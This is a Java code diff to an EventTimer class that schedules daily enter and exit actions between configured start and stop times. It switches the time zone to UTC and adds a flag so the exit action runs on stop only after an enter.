@@ -29,7 +29,7 @@ public class EventTimer extends BaseTimer {
 	/** The Constant TAG. */
 	private static final String TAG = "EventTimer"; //$NON-NLS-1$
 
-	boolean nextDailyIn;
+	boolean nextDailyIn = false;
 
 	/** The type. */
 	private int type;
@@ -41,6 +41,8 @@ public class EventTimer extends BaseTimer {
 	private Date timestart;
 
 	private Date timestop;
+	
+	private boolean needExitOnStop;
 
 	/**
 	 * Instantiates a new timer event.
@@ -60,13 +62,17 @@ public class EventTimer extends BaseTimer {
 	 */
 	@Override
 	public boolean parse(final ConfEvent conf) {
+		needExitOnStop = false;
+		
 		try {
 			String ts = conf.getString("ts");
 			String te = conf.getString("te");
 
-			SimpleDateFormat df = new SimpleDateFormat("HH:mm:ss");
-			timestart = df.parse(ts);
-			timestop = df.parse(te);
+			SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
+			dateFormat.setTimeZone(TimeZone.getTimeZone("UTC"));
+			
+			timestart = dateFormat.parse(ts);
+			timestop = dateFormat.parse(te);
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " type: " + type + " ts:" + ts + " te:" + te);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
@@ -95,10 +101,7 @@ public class EventTimer extends BaseTimer {
 	 */
 	@Override
 	public void actualStart() {
-		final long now = System.currentTimeMillis();
-		Calendar calendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
-
-		long nextStart, nextStop;
+		Calendar calendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("UTC"));
 
 		calendar.setTime(timestart);
 		start = ((calendar.get(Calendar.HOUR_OF_DAY) * 3600) + (calendar.get(Calendar.MINUTE) * 60) + calendar
@@ -109,11 +112,10 @@ public class EventTimer extends BaseTimer {
 				.get(Calendar.SECOND)) * 1000;
 
 		nextDailyIn = setDailyDelay(true);
-
 	}
 
 	private boolean setDailyDelay(boolean initialCheck) {
-		Calendar nowCalendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
+		Calendar nowCalendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("UTC"));
 
 		long nextStart, nextStop;
 
@@ -123,7 +125,8 @@ public class EventTimer extends BaseTimer {
 		if (initialCheck) {
 			initialCheck();
 		}
-		// Estriamo il prossimo evento e determiniamo il delay sulla base del
+		
+		// Estraiamo il prossimo evento e determiniamo il delay sulla base del
 		// tipo
 		if (now < start)
 			nextStart = start;
@@ -136,26 +139,29 @@ public class EventTimer extends BaseTimer {
 			nextStop = stop + (3600 * 24 * 1000); // 1 Day
 
 		boolean ret;
+		
 		// stabilisce quale sara' il prossimo evento.
 		if (nextStart < nextStop) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (setDailyDelay): Delay (next start): " + (nextStart - now)); //$NON-NLS-1$
 			}
+			
 			if (initialCheck)
 				setDelay(nextStart - now);
 			else
 				setPeriod(nextStart - now);
+			
 			ret = true;
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (setDailyDelay): Delay (next stop): " + (nextStop - now)); //$NON-NLS-1$
 			}
-
-			long delay = nextStop - now;
+			
 			if (initialCheck)
 				setDelay(nextStop - now);
 			else
 				setPeriod(nextStop - now);
+			
 			ret = false;
 		}
 
@@ -166,25 +172,30 @@ public class EventTimer extends BaseTimer {
 		Calendar nowCalendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
 		int now = ((nowCalendar.get(Calendar.HOUR_OF_DAY) * 3600) + (nowCalendar.get(Calendar.MINUTE) * 60) + nowCalendar
 				.get(Calendar.SECOND)) * 1000;
+		
 		// verifica se al primo giro occorre chiamare OnEnter
 		if (start < stop) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (setDailyDelay): start < stop ");
 			}
+			
 			if (now > start && now < stop) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (setDailyDelay): we are already in the brackets");
 				}
+				
 				onEnter();
 			}
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (setDailyDelay): start > stop ");
 			}
+			
 			if (now < stop || now > start) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (setDailyDelay): we are already in the inverted brackets");
 				}
+				
 				onEnter();
 			}
 		}
@@ -205,22 +216,29 @@ public class EventTimer extends BaseTimer {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (go): DAILY TIMER: action enter"); //$NON-NLS-1$
 			}
+			
 			onEnter();
+			
+			needExitOnStop = true;
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (go): DAILY TIMER: action exit"); //$NON-NLS-1$
 			}
+			
 			onExit();
+			
+			needExitOnStop = false;
 		}
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (go): daily IN BEFORE: " + nextDailyIn); //$NON-NLS-1$
 		}
+		
 		nextDailyIn = setDailyDelay(false);
+		
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (go): daily IN AFTER: " + nextDailyIn); //$NON-NLS-1$
 		}
-
 	}
 
 	/*
@@ -230,6 +248,7 @@ public class EventTimer extends BaseTimer {
 	 */
 	@Override
 	public void actualStop() {
-		onExit(); // di sicurezza
+		if (needExitOnStop)
+			onExit(); // di sicurezza
 	}
 }
